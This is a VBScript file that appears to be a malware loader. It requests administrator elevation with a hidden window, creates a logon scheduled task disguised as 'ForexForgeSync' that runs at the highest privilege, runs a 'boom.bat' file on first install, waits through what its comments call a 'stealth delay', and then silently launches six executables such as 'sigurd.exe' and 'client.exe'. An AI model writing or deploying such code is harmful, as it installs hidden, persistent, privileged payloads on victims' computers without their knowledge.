Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get paths
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
strScript = WScript.ScriptFullName
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION & INITIAL SETUP ---
' This only runs the VERY FIRST time you open the file
If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("task") Then
    ' Trigger UAC prompt silently (0 = Hidden)
    UAC.ShellExecute "wscript.exe", Chr(34) & strScript & Chr(34) & " /elevate", "", "runas", 0
    WScript.Quit
End If

' --- STEP 2: INSTALL THE TASK (If elevated) ---
strTaskName = "ForexForgeSync"
' We add "/task" to the arguments so the reboot knows not to ask for UAC again
strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B \""" & strScript & "\"" /task"" /sc onlogon /rl highest /f"

' Create the task silently
WshShell.Run "cmd.exe /c " & strCreateTask, 0, True

' --- STEP 3: RUN BOOM.BAT (Only on first install) ---
' We only run boom.bat if we are in the "elevate" phase
If WScript.Arguments.Named.Exists("elevate") Then
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 4: STEALTH DELAY ---
' Wait 30 seconds for the system to settle after login
WScript.Sleep 30000 

' --- STEP 5: LAUNCH APPS ---
' Run all 6 files silently (0 = Hidden)
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
